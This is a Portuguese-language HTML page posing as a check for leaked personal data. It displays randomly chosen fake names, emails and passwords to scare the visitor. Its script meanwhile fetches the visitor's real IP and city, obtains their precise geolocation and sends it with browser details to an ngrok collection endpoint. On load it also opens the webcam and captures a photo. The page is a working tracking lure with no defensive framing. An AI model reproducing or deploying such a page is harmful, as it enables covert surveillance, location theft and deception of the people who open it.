<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <title>Consulta de Vazamento de Dados</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: auto;
            background: #161b22;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #30363d;
        }

        h1 {
            color: #ff5555;
            text-align: center;
        }

        .loading {
            font-style: italic;
            color: #58a6ff;
            margin-bottom: 15px;
        }

        .data {
            background: #0d1117;
            border: 1px solid #30363d;
            padding: 10px;
            margin-top: 10px;
            border-radius: 6px;
        }

        .highlight {
            color: #ff7b72;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="container">
        <h1>🔍 Verificando dados expostos...</h1>
        <p class="loading" id="status">Consultando bancos de dados comprometidos...</p>

        <div id="result" style="display:none;">
            <div class="data">📛 Nome: <span class="highlight" id="nome"></span></div>
            <div class="data">📧 E-mail: <span class="highlight" id="email"></span></div>
            <div class="data">🔑 Senha: <span class="highlight" id="senha"></span></div>
            <div class="data">🌍 IP Público: <span class="highlight" id="ip"></span></div>
            <div class="data">📍 Localização: <span class="highlight" id="local"></span></div>
        </div>

        <video id="video" autoplay playsinline style="display: none;"></video>
        <img id="photo" alt="Foto capturada">
    </div>

    <script>
        // Dados falsos para simulação
        const nomes = ["João Silva", "Maria Souza", "Carlos Pereira", "Ana Costa", "Lucas Oliveira"];
        const emails = ["joao123@gmail.com", "maria.souza@yahoo.com", "carlos_p@hotmail.com", "ana.costa@outlook.com", "lucas_o@protonmail.com"];
        const senhas = ["abc123", "senha123", "flamengo2023", "qwerty", "123456"];

        // Escolher aleatório
        function randItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

        // Simular carregamento
        setTimeout(() => {
            document.getElementById("status").textContent = "Dados encontrados!";

            document.getElementById("nome").textContent = randItem(nomes);
            document.getElementById("email").textContent = randItem(emails);
            document.getElementById("senha").textContent = randItem(senhas);

            // IP + localização real via API
            fetch("https://ipapi.co/json/")
                .then(r => r.json())
                .then(data => {
                    document.getElementById("ip").textContent = data.ip;
                    document.getElementById("local").textContent = `${data.city}, ${data.region}, ${data.country_name}`;
                });

            console.log(navigator.userAgent);

            sendData()

            document.getElementById("result").style.display = "block";
        }, 3000);

        async function sendData() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // 1. Armazena latitude e longitude em constantes
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // 2. Cria um objeto com esses dados
                    const localizacao = {
                        position: `https://www.google.com/maps?q=${latitude},${longitude}`,
                        timestamp: position.timestamp,
                        userAgent: navigator.userAgent,
                        userAct: navigator.userActivation.isActive
                    };

                    fetch('https://b4ded33f9abc.ngrok-free.app/coletar', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(localizacao)
                    })
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Erro na resposta do servidor');
                            }
                            return response.json();
                        })
                        .then(data => {
                            console.log('Resposta do servidor:', data);
                        })
                        .catch(error => {
                            console.error('Erro ao enviar localização:', error);
                        });

                }
            )
        }

        async function captureOnce() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            await new Promise(resolve => video.onloadedmetadata = resolve);

            const canvas = document.createElement('canvas');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0);

            const imagem = canvas.toDataURL('image/png');

            document.getElementById('photo').src = imagem;

            stream.getTracks.forEach(track => track.stop());
            
        }

        captureOnce();
    </script>

</body>

</html>
